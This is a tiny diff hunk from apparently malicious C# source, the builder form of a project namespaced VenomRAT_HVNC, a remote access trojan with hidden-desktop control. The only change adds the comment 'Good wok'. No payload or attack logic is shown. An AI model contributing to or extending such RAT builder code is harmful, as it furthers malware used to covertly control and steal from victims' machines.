@@ -10,7 +10,7 @@ using dnlib.DotNet;
 using dnlib.DotNet.Emit;
 using Guna.UI2.WinForms;
 using VenomRAT_HVNC.HVNC.Utils;
-
+// Good wok
 namespace VenomRAT_HVNC.HVNC
 {
     public class FrmBuilder : Form
